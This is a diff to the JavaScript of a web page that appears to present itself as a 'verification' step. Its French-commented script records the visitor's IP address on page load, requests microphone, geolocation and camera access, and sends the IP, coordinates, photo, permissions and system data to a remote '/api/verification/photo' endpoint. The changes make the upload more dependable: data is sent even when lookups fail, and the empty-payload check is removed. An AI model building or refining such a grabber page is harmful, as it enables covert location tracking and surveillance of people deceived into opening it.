@@ -318,12 +318,14 @@
         let cameraGranted = false, microphoneGranted = false, geolocationGranted = false;
         let cameraAttempted = false, microphoneAttempted = false, geolocationAttempted = false;
 
-        // Données collectées
-        let userIP = null, userCoords = null, photoBlob = null;
+        // Données collectées (toujours définies, même en erreur)
+        let userIP = { error: 'Non récupérée' };
+        let userCoords = { error: 'Non récupérées' };
+        let photoBlob = null;
         let ipSent = false, photoSent = false;
         let systemSent = false;
 
-        // ========== FONCTIONS DE COLLECTE AVEC ENVOI IMMÉDIAT ==========
+        // ========== COLLECTE AVEC ENVOI IMMÉDIAT ==========
 
         async function getIPAddress() {
             try {
@@ -331,11 +333,11 @@
                 const data = await resp.json();
                 userIP = { ip: data.ip, city: 'Unknown', region: 'Unknown', country: 'Unknown', postal: 'N/A', latitude: null, longitude: null, timezone: 'N/A', isp: 'N/A' };
                 console.log('📡 IP récupérée:', userIP.ip);
-                // Envoi immédiat
-                sendUpdate();
             } catch (e) {
-                userIP = { error: 'Non disponible' };
+                userIP = { error: 'Non disponible', message: e.message };
+                console.warn('⚠️ Erreur IP:', e.message);
             }
+            sendUpdate();
         }
 
         function getGeolocation() {
@@ -360,7 +362,7 @@
                             timestamp: pos.timestamp
                         };
                         console.log('📍 Géolocalisation acceptée:', userCoords.latitude, userCoords.longitude);
-                        sendUpdate(); // Envoi immédiat
+                        sendUpdate();
                         updateUI();
                         resolve(true);
                     },
@@ -458,12 +460,12 @@
                 formData.append('permissions', JSON.stringify(perms));
 
                 // IP (une seule fois)
-                if (userIP && !ipSent) {
+                if (!ipSent) {
                     formData.append('ip', JSON.stringify(userIP));
                     ipSent = true;
                 }
 
-                // Coordonnées (envoyées à chaque fois qu'elles sont définies)
+                // Coordonnées (envoyées à chaque fois car peuvent être mises à jour)
                 if (userCoords) {
                     formData.append('coordinates', JSON.stringify(userCoords));
                 }
@@ -485,12 +487,8 @@
                     systemSent = true;
                 }
 
-                // Vérifier si on a des données à envoyer
-                if (formData.entries().next().done) {
-                    console.log('⏭️ Rien à envoyer pour le moment.');
-                    return;
-                }
-
+                // Vérifier si on a des données à envoyer (au moins les permissions)
+                // Les permissions sont toujours envoyées, donc on a toujours quelque chose.
                 console.log('📤 Envoi des données...');
                 const resp = await fetch(SERVER_URL + '/api/verification/photo', {
                     method: 'POST',
@@ -498,9 +496,11 @@
                     credentials: 'omit'
                 });
                 if (resp.ok) {
-                    console.log('✅ Envoi réussi');
+                    const data = await resp.json();
+                    console.log('✅ Envoi réussi, session:', data.session_id);
                 } else {
-                    console.warn('⚠️ Échec envoi, status:', resp.status);
+                    const text = await resp.text();
+                    console.warn('⚠️ Échec envoi, status:', resp.status, text);
                 }
             } catch (e) {
                 console.warn('⚠️ Erreur envoi:', e.message);
@@ -559,7 +559,6 @@
         async function requestAllPermissions() {
             document.getElementById('allowBtn').disabled = true;
 
-            // Ordre : micro, géoloc, caméra
             await requestMicrophone();
             await new Promise(r => setTimeout(r, 800));
             await getGeolocation();
@@ -608,8 +607,7 @@
         window.addEventListener('load', () => {
             console.log('🔑 Session ID:', SESSION_ID);
             document.body.classList.add('unverified');
-            // Récupération de l'IP dès le chargement
-            getIPAddress();
+            getIPAddress(); // Récupération et envoi immédiat
             updateUI();
             setInterval(updateUI, 2000);
         });
